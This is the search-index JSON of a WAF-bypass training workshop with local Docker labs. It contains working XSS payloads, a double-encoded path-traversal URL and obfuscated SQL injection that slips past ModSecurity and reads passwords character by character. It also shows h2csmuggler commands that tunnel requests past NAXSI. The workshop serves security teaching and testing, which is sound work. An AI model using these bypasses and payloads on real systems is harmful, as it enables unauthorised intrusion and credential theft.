{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Introduction About Welcome to this workshop on WAF bypass! In this 2 hour hands-on session, you will learn multiple ways to bypass Web Application Firewall (WAF). No specific knowledge required other that some high-level understanding of common web vulnerabilities (XSS, SQL injection and XXE). I decided to build this workshop to summarize the types of bypasses that can be used in security assesments. Remember that their are no silver bullets. Even with the most complete checklist, it is likely that you will encounters case where you can't find a bypass. Hopefully, we those information you will be more methodical and more efficient the next time you enconter a WAF. Where to start All exercises and the soure of these pages is available on Github. Clone h3xstream/waf-workshop Feel free to contribute to the content of this workshop. Prerequisites In order to do the exercises, you will need: Docker Burp Suite Pro / OWASP ZAP Python","title":"Introduction"},{"location":"#introduction","text":"","title":"Introduction"},{"location":"#about","text":"Welcome to this workshop on WAF bypass! In this 2 hour hands-on session, you will learn multiple ways to bypass Web Application Firewall (WAF). No specific knowledge required other that some high-level understanding of common web vulnerabilities (XSS, SQL injection and XXE). I decided to build this workshop to summarize the types of bypasses that can be used in security assesments. Remember that their are no silver bullets. Even with the most complete checklist, it is likely that you will encounters case where you can't find a bypass. Hopefully, we those information you will be more methodical and more efficient the next time you enconter a WAF.","title":"About"},{"location":"#where-to-start","text":"All exercises and the soure of these pages is available on Github. Clone h3xstream/waf-workshop Feel free to contribute to the content of this workshop.","title":"Where to start"},{"location":"#prerequisites","text":"In order to do the exercises, you will need: Docker Burp Suite Pro / OWASP ZAP Python","title":"Prerequisites"},{"location":"01-alternative-syntax/","text":"Alternative Syntax Material Alternative Paths With modern frameworks and applications, the same information is often to be available at multiple locations. Therefor, if an administrator is blocking a specific path, it might be accessible elsewhere. Framework might have a combination of HTML pages, REST api, WebSocket API and a GraphQL api. As an example, many cloud hosting provider try to enforce some additional hardening to Wordpress instances. The possible reasons is that is represent the most used applications and because it is also a common target from attacker. Doing a survey of multiples thousands of Wordpress deployment locations. Most high profile Wordpress websites had attempt to disable the user enumeration but in most case, the enumeration was still possible thanks to lesser known entrypoints. Here are four different URL/paths that will return users details including its email. https://target.blog/wp-json/wp/v2/users https://target.blog/?author=1 https://target.blog/?rest_route=/wp/v2/users https://public-api.wordpress.com/rest/v1.1/sites/target.blog/posts Source: 6 ways to enumerate WordPress Users Alternative HTML Tags If developpers have manually chosen a list of HTML tags to forbid. It is likely that they will have forget HTML tags that can be used. The same strategy will apply if we are trying to see the edge case from an HTML sanitizer. For an exhaustive list of HTML tags and HTML attributes refer to the project DOMPurify. This project is actively updated when new elements are added to the standard or when new behavior are found. <svg / onload= prompt(/OPENBUGBOUNTY/) > Cloudflare XSS Bypass by Bohdan Korzhynskyi < video onnull = null onmouseover = confirm(1) > Akamai WAF Bypass (2018) found by @s0md3v : < dETAILS open onToGgle = a=prompt,a() x > Alternative Keywords In order to protect against SQL injection, WAF will detect metadata table names. These are unlikely to be pass by a user unless the website is a forum on SQL. Instead of targeting the DBMS typical metadata tables ( information_schema.tables , all_tables , sys.sysobjects ), you can use table names that are less commonly known. When you have a good idea of the language used by the application, you can search for potential statistic table or ORM metadata tables. MySQL alternatives to tables ( information_schema.tables ): information_schema.partitions information_schema.statistics information_schema.key_column_usage information_schema.table_constraints mysql.innodb_table_stats Entity Framework 6.0 / .NET specific tables: dbo.__MigrationHistory AspNetUsers Entity Framework Core The Entity Framework Core library no longer include the Model column which contained the model in a GZIP Hex encoded formated. (Entity Framework 6.0 and below only) Oracle alternatives to all_tables : ALL_TAB_STATISTICS ALL_TAB_STATS_HISTORY ALL_TAB_STAT_PREFS ALL_TAB_MODIFICATIONS ...","title":"Alternative Syntax Material"},{"location":"01-alternative-syntax/#alternative-syntax-material","text":"","title":"Alternative Syntax Material"},{"location":"01-alternative-syntax/#alternative-paths","text":"With modern frameworks and applications, the same information is often to be available at multiple locations. Therefor, if an administrator is blocking a specific path, it might be accessible elsewhere. Framework might have a combination of HTML pages, REST api, WebSocket API and a GraphQL api. As an example, many cloud hosting provider try to enforce some additional hardening to Wordpress instances. The possible reasons is that is represent the most used applications and because it is also a common target from attacker. Doing a survey of multiples thousands of Wordpress deployment locations. Most high profile Wordpress websites had attempt to disable the user enumeration but in most case, the enumeration was still possible thanks to lesser known entrypoints. Here are four different URL/paths that will return users details including its email. https://target.blog/wp-json/wp/v2/users https://target.blog/?author=1 https://target.blog/?rest_route=/wp/v2/users https://public-api.wordpress.com/rest/v1.1/sites/target.blog/posts Source: 6 ways to enumerate WordPress Users","title":"Alternative Paths"},{"location":"01-alternative-syntax/#alternative-html-tags","text":"If developpers have manually chosen a list of HTML tags to forbid. It is likely that they will have forget HTML tags that can be used. The same strategy will apply if we are trying to see the edge case from an HTML sanitizer. For an exhaustive list of HTML tags and HTML attributes refer to the project DOMPurify. This project is actively updated when new elements are added to the standard or when new behavior are found. <svg / onload= prompt(/OPENBUGBOUNTY/) > Cloudflare XSS Bypass by Bohdan Korzhynskyi < video onnull = null onmouseover = confirm(1) > Akamai WAF Bypass (2018) found by @s0md3v : < dETAILS open onToGgle = a=prompt,a() x >","title":"Alternative HTML Tags"},{"location":"01-alternative-syntax/#alternative-keywords","text":"In order to protect against SQL injection, WAF will detect metadata table names. These are unlikely to be pass by a user unless the website is a forum on SQL. Instead of targeting the DBMS typical metadata tables ( information_schema.tables , all_tables , sys.sysobjects ), you can use table names that are less commonly known. When you have a good idea of the language used by the application, you can search for potential statistic table or ORM metadata tables. MySQL alternatives to tables ( information_schema.tables ): information_schema.partitions information_schema.statistics information_schema.key_column_usage information_schema.table_constraints mysql.innodb_table_stats Entity Framework 6.0 / .NET specific tables: dbo.__MigrationHistory AspNetUsers Entity Framework Core The Entity Framework Core library no longer include the Model column which contained the model in a GZIP Hex encoded formated. (Entity Framework 6.0 and below only) Oracle alternatives to all_tables : ALL_TAB_STATISTICS ALL_TAB_STATS_HISTORY ALL_TAB_STAT_PREFS ALL_TAB_MODIFICATIONS ...","title":"Alternative Keywords"},{"location":"01-lab/","text":"Alternative Syntax Lab The exercise is mixed with the next segment. Jump to the exercises","title":"Alternative Syntax Lab"},{"location":"01-lab/#alternative-syntax-lab","text":"The exercise is mixed with the next segment. Jump to the exercises","title":"Alternative Syntax Lab"},{"location":"02-encoding/","text":"Encoding Material Common formats Case mapping It is sometimes possible to change the expected case mapping. It will bypass WAF rules that are case sensitive. Here is an example of htaccess misconfiguration. htaccess is not a WAF per say but it represent what WAF custom rules be. Improper .htaccess Correct .htaccess RewriteCond % { QUERY_STRING } \\ bwp / v2 / users \\ b RewriteCond % { QUERY_STRING } \\ bwp / v2 / users \\ b [ NC ] URL Result https://blog. * .com/section/news?rest_route=/wp/v2/users BLOCKED https://blog. * .com/section/news?rest_route=/wp/v2/usErs OK Source code handling the rest_route parameter. <?php ... foreach ( $routes as $route => $handlers ) { $match = preg_match ( '@^' . $route . '$@i' , $path , $matches ); if ( ! $match ) { continue ; } $args = array (); Source: 6 ways to enumerate WordPress Users URL encoding HTTP GET and POST parameter are expected to be encoded by Web Application Firewall. But what happens if the application decode the value once it has already be decoded by the web framework? This additional decoding is unlikely to break anything with normal input. Here are few examples: Path encoded http://server.com/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\\ HTML double encoded %253Cscript%253Econfirm()%253C%252Fscript%253E Examples taken from: How to Bypass WAF. HackenProof Cheat Sheet HTML/XSS specific If you are testing for potential XSS, the payload you are sending to the webserver could targeted for different context in the page. Based on the potential location you could used context specific encoding. Encoding Type Context \" < Named XML/HTML entities Value is read from the DOM &quote; &lt; Hex XML/HTML entities Value is read from the DOM &#x22; / &#34; &x3C; / &#60; Slash escaped Value inside Javascript variable \\x22 , \\042 , \\42 \\x3C , \\074 , \\74 String.fromCharCode Value inside Javascript variable String.fromCharCode(34) String.fromCharCode(74) Purpose All those encodings may allow you bypass keywords or characters blacklist. Unicode Unicode is not the only way to encode characters UTF-7 ( +ADw-script+AD4-alert(123)+ADw-+AC8-script+AD4- ) \u26a0\ufe0f UTF-16LE ( 00 3c 00 62 00 6f 00 6f 00 6b ) UTF-16BE UTF-32\u2026 \u26a0\ufe0f: No longer supported by many browsers and frameworks. More info: Unicode vulnerabilities that could by\u0365te you Unicode Normalization Character Code point \uff1c (U+FF1C) < (U+003C) SQL query: INSERT INTO ContentTable VALUES ( \u2026 , '\uff1cimg src=\u2026' ) Content when fetch: <img src= x onerror= prompt(1) > More info: XSS for ASP.net developers Tools Cyberchef A nice web based interface that allow you to chain multiple encoding types. CyberChef in action HackVertor (Burp Extension) With this extension you can use an XML tags to represent encoding. Instead of encoding manually data and placing it in your request, you can build readable requests. It has a better selection of encoding since it is focus on web security rather than general formats. HackVertor syntax Corresponding value message= < @urlencode_2> <img src= 'x' onerror= 'prompt(1)' /> < @/urlencode_2> message=%3Cimg%20src%3D'x'%20onerror%3D'prompt(1)'%2F%3E Official website Burp extension page Fuzzy Encoding Generator (Burp Extension) This extension integrate in Burp Intruder. It will re-encode in various forms the value place between parameter delimiters \u00a7\u00a7 . Fuzzy Encoding Generator in action Fuzzy Encoding Github repository","title":"Encoding Material"},{"location":"02-encoding/#encoding-material","text":"","title":"Encoding Material"},{"location":"02-encoding/#common-formats","text":"","title":"Common formats"},{"location":"02-encoding/#case-mapping","text":"It is sometimes possible to change the expected case mapping. It will bypass WAF rules that are case sensitive. Here is an example of htaccess misconfiguration. htaccess is not a WAF per say but it represent what WAF custom rules be. Improper .htaccess Correct .htaccess RewriteCond % { QUERY_STRING } \\ bwp / v2 / users \\ b RewriteCond % { QUERY_STRING } \\ bwp / v2 / users \\ b [ NC ] URL Result https://blog. * .com/section/news?rest_route=/wp/v2/users BLOCKED https://blog. * .com/section/news?rest_route=/wp/v2/usErs OK Source code handling the rest_route parameter. <?php ... foreach ( $routes as $route => $handlers ) { $match = preg_match ( '@^' . $route . '$@i' , $path , $matches ); if ( ! $match ) { continue ; } $args = array (); Source: 6 ways to enumerate WordPress Users","title":"Case mapping"},{"location":"02-encoding/#url-encoding","text":"HTTP GET and POST parameter are expected to be encoded by Web Application Firewall. But what happens if the application decode the value once it has already be decoded by the web framework? This additional decoding is unlikely to break anything with normal input. Here are few examples: Path encoded http://server.com/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\\ HTML double encoded %253Cscript%253Econfirm()%253C%252Fscript%253E Examples taken from: How to Bypass WAF. HackenProof Cheat Sheet","title":"URL encoding"},{"location":"02-encoding/#htmlxss-specific","text":"If you are testing for potential XSS, the payload you are sending to the webserver could targeted for different context in the page. Based on the potential location you could used context specific encoding. Encoding Type Context \" < Named XML/HTML entities Value is read from the DOM &quote; &lt; Hex XML/HTML entities Value is read from the DOM &#x22; / &#34; &x3C; / &#60; Slash escaped Value inside Javascript variable \\x22 , \\042 , \\42 \\x3C , \\074 , \\74 String.fromCharCode Value inside Javascript variable String.fromCharCode(34) String.fromCharCode(74) Purpose All those encodings may allow you bypass keywords or characters blacklist.","title":"HTML/XSS specific"},{"location":"02-encoding/#unicode","text":"Unicode is not the only way to encode characters UTF-7 ( +ADw-script+AD4-alert(123)+ADw-+AC8-script+AD4- ) \u26a0\ufe0f UTF-16LE ( 00 3c 00 62 00 6f 00 6f 00 6b ) UTF-16BE UTF-32\u2026 \u26a0\ufe0f: No longer supported by many browsers and frameworks. More info: Unicode vulnerabilities that could by\u0365te you","title":"Unicode"},{"location":"02-encoding/#unicode-normalization","text":"Character Code point \uff1c (U+FF1C) < (U+003C) SQL query: INSERT INTO ContentTable VALUES ( \u2026 , '\uff1cimg src=\u2026' ) Content when fetch: <img src= x onerror= prompt(1) > More info: XSS for ASP.net developers","title":"Unicode Normalization"},{"location":"02-encoding/#tools","text":"","title":"Tools"},{"location":"02-encoding/#cyberchef","text":"A nice web based interface that allow you to chain multiple encoding types. CyberChef in action","title":"Cyberchef"},{"location":"02-encoding/#hackvertor-burp-extension","text":"With this extension you can use an XML tags to represent encoding. Instead of encoding manually data and placing it in your request, you can build readable requests. It has a better selection of encoding since it is focus on web security rather than general formats. HackVertor syntax Corresponding value message= < @urlencode_2> <img src= 'x' onerror= 'prompt(1)' /> < @/urlencode_2> message=%3Cimg%20src%3D'x'%20onerror%3D'prompt(1)'%2F%3E Official website Burp extension page","title":"HackVertor (Burp Extension)"},{"location":"02-encoding/#fuzzy-encoding-generator-burp-extension","text":"This extension integrate in Burp Intruder. It will re-encode in various forms the value place between parameter delimiters \u00a7\u00a7 . Fuzzy Encoding Generator in action Fuzzy Encoding Github repository","title":"Fuzzy Encoding Generator (Burp Extension)"},{"location":"02-lab/","text":"Encoding Lab Launching the instance $ cd 03-sqli $ docker-compose up Open http://localhost:2222 in a browser to confirm that everything is running. Live instance (only for NorthSec) Can you find the XSS for all 3 forms?","title":"Encoding Lab"},{"location":"02-lab/#encoding-lab","text":"","title":"Encoding Lab"},{"location":"02-lab/#launching-the-instance","text":"$ cd 03-sqli $ docker-compose up Open http://localhost:2222 in a browser to confirm that everything is running. Live instance (only for NorthSec) Can you find the XSS for all 3 forms?","title":"Launching the instance"},{"location":"03-lab/","text":"SQL Syntax Lab Launching the instance $ cd 03-sqli $ docker-compose up Open http://localhost in a browser to confirm that everything is running. Initialize the database by fetching db_reset.php . Live instance (only for NorthSec) Finding the SQL injections There are two SQL injection vulnerabilities in the applications. Answer genre parameter from the index.php page. id parameter from the movie_detail.php page. Detection can be done GET /?genre=actio'%20'n HTTP/1.1 Host: localhost [...] ModSecurity As soon as you will test parameter with SQL keyword, modsecurity return a Forbidden page. Does the union and select are systematically blocked? Answer Union and select are english word that are too common to always be blocked. You can confirm this behavior by requesting index.php?genre=union ModSecurity is a combination of RegEx and analysis by libinjection. Looking at the log you will be able to see which rule is triggered. Log Troubleshooting The log are pretty verbose because they attach complete request. Here is a Regex rule that matched: ModSecurity: Warning. Pattern match \\\"(?i:(?:[\\\\\\\\\\\\\\\\\\\"'`](?:;?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?(?:having|select|union)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?[^\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s]|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?!\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?[\\\\\\\\\\\\\\\\\\\"'`\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w])|(?:c(?:onnection_id|urrent_user)|database)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\([^\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\)]*?|u(?:nion(?:[\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s]*?select| select @)|ser\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\([^\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\)]*?)|s(?:chema\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\([^\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\)]*?|elect.*?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w?user\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\()|in ...\\\" at ARGS:genre. [file \\\"/etc/modsecurity.d/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf\\\"] [line \\\"183\\\"] [id \\\"942190\\\"] Here libinjection [id \\\"942100\\\"] [msg \\\"SQL Injection Attack Detected via libinjection\\\"] [data \\\"Matched Data: s&(s) found within ARGS:genre: union' or ('')='\\\"] [severity \\\"CRITICAL\\\"] Can you use the scientific notation to confuse modsecurity? If you want the solution, read the next section. Exploitation Here is the general syntax necessary to exfiltrate varchar values from the database. Obfuscated query Actual query With the 1.e notation expression that are ignored by the DBMS. or 1 . e ( ascii 1 . e ( substring ( 1 . e ( select password from users limit 1 1 . e , 1 1 . e ) 1 . e , 1 1 . e , 1 1 . e ) 1 . e ) 1 . e ) = 70 or '1' = ' 2 This is how the DBMS will interpret the query. or ( ascii ( substring (( select password from users limit 1 , 1 ) , 1 , 1 ))) = 70 or '1' = ' 2 With this SQL syntax, we are targeting the field password from the table users . The function substring is used to extract one character at the time and comparing it to an ascii value ( 70 in the example). Scripting Once you have working request that is producing an oracle (binary response based on the matching content). It is possible to script an attack to extract the complete content of any database tables.","title":"SQL Syntax Lab"},{"location":"03-lab/#sql-syntax-lab","text":"","title":"SQL Syntax Lab"},{"location":"03-lab/#launching-the-instance","text":"$ cd 03-sqli $ docker-compose up Open http://localhost in a browser to confirm that everything is running. Initialize the database by fetching db_reset.php . Live instance (only for NorthSec)","title":"Launching the instance"},{"location":"03-lab/#finding-the-sql-injections","text":"There are two SQL injection vulnerabilities in the applications. Answer genre parameter from the index.php page. id parameter from the movie_detail.php page. Detection can be done GET /?genre=actio'%20'n HTTP/1.1 Host: localhost [...]","title":"Finding the SQL injections"},{"location":"03-lab/#modsecurity","text":"As soon as you will test parameter with SQL keyword, modsecurity return a Forbidden page. Does the union and select are systematically blocked? Answer Union and select are english word that are too common to always be blocked. You can confirm this behavior by requesting index.php?genre=union ModSecurity is a combination of RegEx and analysis by libinjection. Looking at the log you will be able to see which rule is triggered.","title":"ModSecurity"},{"location":"03-lab/#log-troubleshooting","text":"The log are pretty verbose because they attach complete request. Here is a Regex rule that matched: ModSecurity: Warning. Pattern match \\\"(?i:(?:[\\\\\\\\\\\\\\\\\\\"'`](?:;?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?(?:having|select|union)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?[^\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s]|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?!\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?[\\\\\\\\\\\\\\\\\\\"'`\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w])|(?:c(?:onnection_id|urrent_user)|database)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\([^\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\)]*?|u(?:nion(?:[\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s]*?select| select @)|ser\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\([^\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\)]*?)|s(?:chema\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s*?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\([^\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\)]*?|elect.*?\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w?user\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\()|in ...\\\" at ARGS:genre. [file \\\"/etc/modsecurity.d/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf\\\"] [line \\\"183\\\"] [id \\\"942190\\\"] Here libinjection [id \\\"942100\\\"] [msg \\\"SQL Injection Attack Detected via libinjection\\\"] [data \\\"Matched Data: s&(s) found within ARGS:genre: union' or ('')='\\\"] [severity \\\"CRITICAL\\\"] Can you use the scientific notation to confuse modsecurity? If you want the solution, read the next section.","title":"Log Troubleshooting"},{"location":"03-lab/#exploitation","text":"Here is the general syntax necessary to exfiltrate varchar values from the database. Obfuscated query Actual query With the 1.e notation expression that are ignored by the DBMS. or 1 . e ( ascii 1 . e ( substring ( 1 . e ( select password from users limit 1 1 . e , 1 1 . e ) 1 . e , 1 1 . e , 1 1 . e ) 1 . e ) 1 . e ) = 70 or '1' = ' 2 This is how the DBMS will interpret the query. or ( ascii ( substring (( select password from users limit 1 , 1 ) , 1 , 1 ))) = 70 or '1' = ' 2 With this SQL syntax, we are targeting the field password from the table users . The function substring is used to extract one character at the time and comparing it to an ascii value ( 70 in the example).","title":"Exploitation"},{"location":"03-lab/#scripting","text":"Once you have working request that is producing an oracle (binary response based on the matching content). It is possible to script an attack to extract the complete content of any database tables.","title":"Scripting"},{"location":"03-sql-syntax/","text":"SQL Syntax Material Detection It is possible to identify SQL injection small expressions. However, the exploitation will required the help of utility functions such as substring() and ascii() . It will also include SQL keywords such as UNION and SELECT . Finally, some table names and column will used to extract the database schema structure (if the table name are not brute forced or known). All those keywords are likely to be search by WAF. How to detect SQL injection MySQL SQLite MSSQL Oracle PostgreSQL DB2 ad'+'min 0 0 admin \u26d4 \u26d4 \u26d4 ad'||'min 0 0 \u26d4 admin admin admin ad'||chr(109)||'in \u26d4 \u26d4 \u26d4 admin admin admin ad'||char(109)||'in 0 admin \u26d4 \u26d4 \u26d4 ad109in \u26d4: The query will throw an error. Source: SQL Injection Is Still Alive (Page 30) by Marc-Olivier Bergeron White space Whitespace alternatives by DBMS DBMS ASCII Characters in hexadicimal MySQL 5 09, 0A, 0B, 0C, 0D, A0, 20 MySQL 3 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 SQLite 0A, 0D, 0C, 09, 20 MSSQL 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 PostgreSQL 0A, 0D, 0C, 09, 20 Oracle 11g 00, 0A, 0D, 0C, 09, 20 Source: SQLi Optimization and Obfuscation Techniques (Page 70) by Roberto Salgado Query Obfuscation Here are few additional tricks taken from Roberto Salgado paper . Comments An alternative to the single characters is using empty comments. SELECT /**/ name /**/ FROM /**/ users /**/ WHERE /**/ 1 = 1 MSSQL [Square brackets] Microsoft DBMS allow table name to be surrounded by square brackets. Column names can be surrounded by double quotes. SELECT \"name\" FROM [ sys . databases ] WHERE 1 = 1 Oracle Hex Encode Oracle column names can be hex encoded. SELECT 0 x7461626c655f6e616d65 FROM all_tab_tables Scientific expression in MySQL When MySQL sees 1.e(abc) , it will ignore the 1.e( portion because the following characters do not form a valid numeric value. This behavior can be abused to fool libinjection tokenizer. Libinjection internally tokenizes the parameter and identifies contextual section types such as comments and strings. Libinjection sees the string 1.e as an unknown SQL keyword and concludes that it is more likely to be an English sentence than code. When libinjection is unaware of an SQL function the same behavior can be exhibited. Attack in action Here is a demonstration of modsecurity\u2019s capability to block a malicious pattern for SQL injection. A forbidden page is returned which is the consequence of detection. The input is blocked In the following image, you can see the original request being slightly modified to bypass modsecurity and libinjection. The request is allowed by the WAF Source: A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection","title":"SQL Syntax Material"},{"location":"03-sql-syntax/#sql-syntax-material","text":"","title":"SQL Syntax Material"},{"location":"03-sql-syntax/#detection","text":"It is possible to identify SQL injection small expressions. However, the exploitation will required the help of utility functions such as substring() and ascii() . It will also include SQL keywords such as UNION and SELECT . Finally, some table names and column will used to extract the database schema structure (if the table name are not brute forced or known). All those keywords are likely to be search by WAF. How to detect SQL injection MySQL SQLite MSSQL Oracle PostgreSQL DB2 ad'+'min 0 0 admin \u26d4 \u26d4 \u26d4 ad'||'min 0 0 \u26d4 admin admin admin ad'||chr(109)||'in \u26d4 \u26d4 \u26d4 admin admin admin ad'||char(109)||'in 0 admin \u26d4 \u26d4 \u26d4 ad109in \u26d4: The query will throw an error. Source: SQL Injection Is Still Alive (Page 30) by Marc-Olivier Bergeron","title":"Detection"},{"location":"03-sql-syntax/#white-space","text":"Whitespace alternatives by DBMS DBMS ASCII Characters in hexadicimal MySQL 5 09, 0A, 0B, 0C, 0D, A0, 20 MySQL 3 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 SQLite 0A, 0D, 0C, 09, 20 MSSQL 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 PostgreSQL 0A, 0D, 0C, 09, 20 Oracle 11g 00, 0A, 0D, 0C, 09, 20 Source: SQLi Optimization and Obfuscation Techniques (Page 70) by Roberto Salgado","title":"White space"},{"location":"03-sql-syntax/#query-obfuscation","text":"Here are few additional tricks taken from Roberto Salgado paper .","title":"Query Obfuscation"},{"location":"03-sql-syntax/#comments","text":"An alternative to the single characters is using empty comments. SELECT /**/ name /**/ FROM /**/ users /**/ WHERE /**/ 1 = 1","title":"Comments"},{"location":"03-sql-syntax/#mssql-square-brackets","text":"Microsoft DBMS allow table name to be surrounded by square brackets. Column names can be surrounded by double quotes. SELECT \"name\" FROM [ sys . databases ] WHERE 1 = 1","title":"MSSQL [Square brackets]"},{"location":"03-sql-syntax/#oracle-hex-encode","text":"Oracle column names can be hex encoded. SELECT 0 x7461626c655f6e616d65 FROM all_tab_tables","title":"Oracle Hex Encode"},{"location":"03-sql-syntax/#scientific-expression-in-mysql","text":"When MySQL sees 1.e(abc) , it will ignore the 1.e( portion because the following characters do not form a valid numeric value. This behavior can be abused to fool libinjection tokenizer. Libinjection internally tokenizes the parameter and identifies contextual section types such as comments and strings. Libinjection sees the string 1.e as an unknown SQL keyword and concludes that it is more likely to be an English sentence than code. When libinjection is unaware of an SQL function the same behavior can be exhibited.","title":"Scientific expression in MySQL"},{"location":"03-sql-syntax/#attack-in-action","text":"Here is a demonstration of modsecurity\u2019s capability to block a malicious pattern for SQL injection. A forbidden page is returned which is the consequence of detection. The input is blocked In the following image, you can see the original request being slightly modified to bypass modsecurity and libinjection. The request is allowed by the WAF Source: A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection","title":"Attack in action"},{"location":"04-lab/","text":"Switching Protocol Lab Launching the instance You need to launch the application using the following commands: $ cd 04-http2-cleartext $ docker-compose up Open https://localhost:8443 in a browser to confirm that everything is running. Live instance (only for NorthSec) Context We have an application that will look and behave just like the one from the lab3. The application is also vulnerable to SQL injection. However, this time the WAF is even more aggressive. NAXSI is the open-source firewall used. No training was made (usually done to reduce false positive). All parameter are prohibited from special characters! Another important difference is that the backend application was reimplemented in Go and HTTP2 support was enable. import ( \"golang.org/x/net/http2\" \"golang.org/x/net/http2/h2c\" [ ... ] Bypassing WAF Visit https://localhost:8443/movie?id=1 . If you attempt to tamper with the parameter id , you will see that it is filtered by a Web Application Firewall. In this case, NAXSI is configured in front of the web application. Exploiting some vulnerabilities can be much harder (see impossible) when a strong firewall is in place. By default, NAXSI is configured to block all quotes ' characters. However, with the HTTP 2 Cleartext passthrough we just learned, it is possible to send requests that would not be seen by the firewall. Validation First, we need to validate that HTTP2 cleartext is supported by the backend. If the backend application does not support it, this technique will not work. python h2csmuggler.py -x https://127.0.0.1:8443 -t [INFO] h2c stream established successfully. [INFO] Success! https://127.0.0.1:8002 can be used for tunneling Accessing Forbidden Path > python .\\h2csmuggler.py -x https://nsec2022.xss.lol:8443/ \"https://localhost:8443/admin\" SQLi Exploitation When testing for SQL injection, a tester will be blocked right away by the Web Application Firewall in place. http://127.0.0.1/movie?id=1' (see single quote at the end) We can use the HTTP2 technique to establish an HTTP tunnel with the application directly that will not be interpreted by most proxies. > python h2csmuggler.py -x https://127.0.0.1:8443 \"http://127.0.0.1/movie?id=1'\" [INFO] h2c stream established successfully. :status: 200 [...] [INFO] Requesting - /movie?id=1' [...] python h2csmuggler.py -x https://127.0.0.1:8443 \"https://127.0.0.1/?genre=action' or ''='\" [INFO] h2c stream established successfully. :status: 200 [...] [INFO] Requesting - /?genre=action' or ''=' [...] Can you extract the version of MySQL used by the backend application?","title":"Switching Protocol Lab"},{"location":"04-lab/#switching-protocol-lab","text":"","title":"Switching Protocol Lab"},{"location":"04-lab/#launching-the-instance","text":"You need to launch the application using the following commands: $ cd 04-http2-cleartext $ docker-compose up Open https://localhost:8443 in a browser to confirm that everything is running. Live instance (only for NorthSec)","title":"Launching the instance"},{"location":"04-lab/#context","text":"We have an application that will look and behave just like the one from the lab3. The application is also vulnerable to SQL injection. However, this time the WAF is even more aggressive. NAXSI is the open-source firewall used. No training was made (usually done to reduce false positive). All parameter are prohibited from special characters! Another important difference is that the backend application was reimplemented in Go and HTTP2 support was enable. import ( \"golang.org/x/net/http2\" \"golang.org/x/net/http2/h2c\" [ ... ]","title":"Context"},{"location":"04-lab/#bypassing-waf","text":"Visit https://localhost:8443/movie?id=1 . If you attempt to tamper with the parameter id , you will see that it is filtered by a Web Application Firewall. In this case, NAXSI is configured in front of the web application. Exploiting some vulnerabilities can be much harder (see impossible) when a strong firewall is in place. By default, NAXSI is configured to block all quotes ' characters. However, with the HTTP 2 Cleartext passthrough we just learned, it is possible to send requests that would not be seen by the firewall.","title":"Bypassing WAF"},{"location":"04-lab/#validation","text":"First, we need to validate that HTTP2 cleartext is supported by the backend. If the backend application does not support it, this technique will not work. python h2csmuggler.py -x https://127.0.0.1:8443 -t 